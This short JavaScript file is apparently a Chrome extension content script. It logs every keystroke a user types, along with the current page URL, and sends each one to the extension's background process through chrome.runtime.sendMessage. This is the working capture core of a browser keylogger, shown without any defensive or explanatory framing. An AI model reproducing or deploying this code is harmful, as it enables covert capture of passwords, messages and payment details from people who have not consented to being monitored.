chrome.runtime.onConnect.addListener(function (port) {});
var k = "";
var data = {};
window.onkeydown = function (event) {
  if (event.key.length > 1) {
    k = " (" + event.key + ") ";
  } else {
    k = event.key;
  }

  data = {
    key: k,
    page: window.location.href,
  };
  chrome.runtime.sendMessage(data);
};
